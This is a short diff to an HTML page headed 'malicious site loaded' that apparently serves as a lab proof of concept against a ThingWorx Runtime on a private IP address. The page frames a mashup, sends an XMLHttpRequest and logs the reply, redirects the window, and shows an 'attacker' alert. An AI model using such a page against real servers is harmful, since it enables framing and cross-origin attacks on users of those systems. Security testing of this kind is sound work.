@@ -7,7 +7,7 @@
   <body>
     <h2> malicious site loaded </h2>
 
-    <iframe id="test" src="https://192.168.48.147/Thingworx/Runtime/index.html?mashup=InsecureExpressions"> </iframe>
+    <iframe id="test" src="https://192.168.48.147/Thingworx/Runtime/index.html?mashup=RowSelectionExample"> </iframe>
     <script type="text/javascript">
       
       let xhr = new XMLHttpRequest();
@@ -19,7 +19,7 @@
         console.log(xhr.responseText);
       };
       console.log(window.document.getElementById("test"));
-      window.location = "https://www.bing.com"
+      window.location = "https://192.168.48.147/Thingworx/Runtime/index.html?mashup=RowSelectionExample"
       alert("hello from attacker");
     </script>
 
